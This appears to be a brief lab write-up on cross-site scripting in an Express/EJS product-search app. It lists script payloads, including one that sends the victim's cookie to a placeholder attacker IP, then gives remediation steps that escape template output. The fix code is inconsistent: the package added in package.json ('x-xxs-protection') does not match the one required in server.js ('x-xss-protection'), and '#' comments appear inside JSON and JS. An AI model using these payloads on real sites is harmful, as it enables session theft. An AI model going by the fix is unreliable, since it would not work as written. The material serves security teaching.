## Exploiting 

```
# Get a pop-up with the given text 
<script>alert('XSS Success')</script>

# Print the cookie to the pop-up
<script>alert('Cookie:'+document.cookie)</script>

# Send the cookie to a attacker controled web server
<script>new Image().src='http://<<ATTACKER IP>>/'+document.cookie;</script>
```


## Fix 
---

Changes to ` package.json`
```js
# Add a colon
"sequelize": "^4.13.10",

# Add the package 
"x-xxs-protection": "^1.0.0",
```

Changes to `server.js`
```js
# include the added package 
var xssFilter = require('x-xss-protection')

# Set the Header
app.use(xssFilter())

```

Changes to `product.js`
```js
# Change how we want to output (print) the added values 
//Listing products with <strong>search query: </strong> <%- output.searchTerm %>
Listing products with <strong>search query: </strong> <%= output.searchTerm %>

# print the added products with above method
          /* Remove 
                <td><%- output.products[i].id %></td>
                <td><%- output.products[i].name %></td>
                <td><%- output.products[i].code %></td>
                <td><%- output.products[i].tags %></td>
                <td><%- output.products[i].description %></td>
          */
          // Add the following
                <td><%= output.products[i].id %></td>
                <td><%= output.products[i].name %></td>
                <td><%= output.products[i].code %></td>
                <td><%= output.products[i].tags %></td>
                <td><%= output.products[i].description %></td>

```






